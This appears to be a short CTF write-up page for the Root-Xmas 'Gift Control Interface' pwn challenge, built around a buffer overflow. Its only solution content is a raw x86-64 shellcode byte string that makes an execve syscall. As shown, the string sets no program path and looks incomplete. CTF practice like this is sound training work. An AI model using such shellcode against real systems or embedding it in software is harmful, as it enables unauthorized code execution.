---
layout: Post
format: chall
title: Day 23 - Gift Control Interface
date: 2024-12-23
ctf: Root-Xmas
tags: [Unicorn, Buffer Overflow, Shellcode]
category: [Pwn]
---
# Day 23 - Gift Control Interface

<a class="back-link" href="../../">< Go back</a>

## Description

This year, to easily handle people's Christmas lists, the elves teamed up to develop a cutting-edge application: the Gift Control Interface.

Try it out and maybe you'll get a flag from Santa Claus!

Author : Voydstack
<https://deploy.xmas.root-me.org>
nc dyn-01.xmas.root-me.org PORT

all files in [resources/](./resources) were provided.

## Challenge

\x48\x31\xc0\x50\x48\x89\xe2\x50\x48\x89\xe2\x50\x48\x89\xe2\xb0\x3b\x0f\x05
